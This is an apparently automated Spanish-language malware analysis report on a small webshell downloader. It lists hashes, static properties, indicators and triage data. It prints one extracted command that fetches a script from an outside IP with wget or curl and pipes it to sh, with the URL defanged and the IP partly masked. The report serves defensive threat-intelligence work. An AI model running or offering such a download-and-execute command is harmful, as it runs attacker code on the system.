# 🧬 Payload Analysis

`858fd8db1538cb26196f7c85b460e3b56ad5ab7ae0e5f49e6329cb1b1d1c09fb`

## 📌 Resumen

Artefacto asociado a la familia **webshell** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Ejecución. Se identificó 1 comando observado o extraído. Se identificaron 6 indicadores técnicos. **Ficha malware:** [malware-like/oraculo/downloader/858fd8db1538cb26196f7c85b460e3b56ad5ab7ae0e5f49e6329cb1b1d1c09fb.md](../../../../../malware-like/oraculo/downloader/858fd8db1538cb26196f7c85b460e3b56ad5ab7ae0e5f49e6329cb1b1d1c09fb.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Familia:** `webshell`
- **Confianza de familia:** `Media`
- **Riesgo:** `Critical`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:51:31.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `858fd8db1538cb26196f7c85b460e3b56ad5ab7ae0e5f49e6329cb1b1d1c09fb`
- **SHA1:** `d2564121187f39d449ed0198b0077b7d07e3def6`
- **MD5:** `899caf42a593bdea79dcb465fd98e368`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 1.3 KiB |
| Entropía | 5.66 |
| Strings | 25 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=6

## 🖥️ Comandos observados / extraídos

```text
(wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh || curl -sk hxxps://217.60.195.XXX/sh) | sh -s apache.selfre
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxps://217.60.195.XXX/sh) | strings |
| url | hxxps://217.60.195.XXX/sh | strings |
| ip | 217.60.195.XXX | static_analysis |
| ip | 190.179.169.XXX | static_analysis |
| command | (wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh \|\| curl -sk hxxps://217.60.195.XXX/sh) \| sh -s apache.selfre | strings |
| hash | 858fd8db1538cb26196f7c85b460e3b56ad5ab7ae0e5f49e6329cb1b1d1c09fb | static_analysis |
| ip | 60.165.53.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
